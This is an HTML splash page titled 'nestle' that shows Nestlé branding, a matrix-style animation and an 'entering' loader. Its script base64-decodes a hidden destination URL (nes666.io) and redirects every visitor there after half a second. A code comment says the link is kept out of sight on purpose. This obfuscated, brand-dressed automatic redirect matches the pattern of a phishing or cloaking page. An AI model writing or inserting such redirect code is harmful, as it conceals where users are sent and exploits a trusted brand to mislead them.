<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>nestle</title>
  <style>
    :root{
      --bg:#070707;
      --mint:#00ff9d;
      --mint-dim:#00cc7a;
      --choco:#2d1808;
      --muted:#7a7a7a;
    }
    *{box-sizing:border-box;margin:0}
    html,body{
      height:100%;
      background:var(--bg);
      color:#e8e8e8;
      font-family:"SF Pro Display",ui-sans-serif,system-ui,sans-serif;
      overflow:hidden;
    }
    #matrix{position:fixed;inset:0;width:100%;height:100%;opacity:.35;pointer-events:none}
    .stage{
      position:relative;z-index:1;
      min-height:100%;
      display:flex;flex-direction:column;
      align-items:center;justify-content:center;
      gap:18px;
      padding:24px;
      background:
        radial-gradient(ellipse 70% 50% at 50% 40%, rgba(0,255,157,.08), transparent 60%),
        radial-gradient(ellipse 50% 40% at 50% 80%, rgba(45,24,8,.35), transparent 55%);
    }
    .logo{
      width:min(200px,58vw);
      height:auto;
      border-radius:16px;
      filter:drop-shadow(0 0 28px rgba(0,255,157,.28));
      animation:breathe 2.4s ease-in-out infinite;
    }
    .mark{
      width:140px;height:70px;border-radius:14px;
      background:linear-gradient(135deg,var(--mint),var(--mint-dim));
      color:var(--choco);
      display:flex;align-items:center;justify-content:center;
      font-weight:900;letter-spacing:3px;
      animation:breathe 2.4s ease-in-out infinite;
    }
    .line{
      font-size:13px;
      letter-spacing:.35em;
      text-transform:uppercase;
      color:var(--muted);
      opacity:0;
      animation:fadein .5s ease .1s forwards;
    }
    .bar{
      width:120px;height:2px;
      border-radius:999px;
      background:rgba(255,255,255,.08);
      overflow:hidden;
      opacity:0;
      animation:fadein .4s ease .15s forwards;
    }
    .bar>i{
      display:block;height:100%;width:0;
      background:linear-gradient(90deg,transparent,var(--mint),transparent);
      animation:load .55s ease .05s forwards;
    }
    @keyframes breathe{
      0%,100%{transform:scale(1);filter:drop-shadow(0 0 22px rgba(0,255,157,.22))}
      50%{transform:scale(1.03);filter:drop-shadow(0 0 36px rgba(0,255,157,.4))}
    }
    @keyframes fadein{to{opacity:1}}
    @keyframes load{to{width:100%}}
  </style>
</head>
<body>
  <canvas id="matrix" aria-hidden="true"></canvas>
  <div class="stage">
    <img class="logo" src="77gj.gif" alt="" onerror="this.replaceWith(Object.assign(document.createElement('div'),{className:'mark',textContent:'NESTLÉ'}))" />
    <p class="line">entering</p>
    <div class="bar" aria-hidden="true"><i></i></div>
  </div>
  <script>
    (function(){
      const canvas=document.getElementById('matrix');
      const ctx=canvas.getContext('2d');
      const letters='nestle'.split('');
      const fontSize=14;
      let w,h,dpr,cols,colW,drops=[];

      function resize(){
        dpr=window.devicePixelRatio||1;
        w=canvas.width=Math.floor(window.innerWidth*dpr);
        h=canvas.height=Math.floor(window.innerHeight*dpr);
        colW=fontSize*dpr;
        cols=Math.ceil(w/colW);
        while(drops.length<cols)drops.push(Math.random()*-80);
        drops.length=cols;
      }
      resize();
      window.addEventListener('resize',resize);

      function draw(){
        ctx.fillStyle='rgba(7,7,7,0.14)';
        ctx.fillRect(0,0,w,h);
        ctx.font=colW+'px ui-monospace,Consolas,monospace';
        ctx.textBaseline='top';
        for(let i=0;i<cols;i++){
          const ch=letters[(Math.random()*letters.length)|0];
          ctx.fillStyle=Math.random()<0.1?'#d4fff0':'#00cc7a';
          ctx.fillText(ch,i*colW,drops[i]*colW);
          if(drops[i]*colW>h&&Math.random()>0.98)drops[i]=0;
          else drops[i]+=0.35+Math.random()*0.45;
        }
      }
      const rain=setInterval(draw,50);

      // no visible link — destination is decoded at runtime
      const go=()=>{
        clearInterval(rain);
        location.replace(atob('aHR0cHM6Ly9uZXM2NjYuaW8='));
      };
      setTimeout(go,480);
    })();
  </script>
</body>
</html>
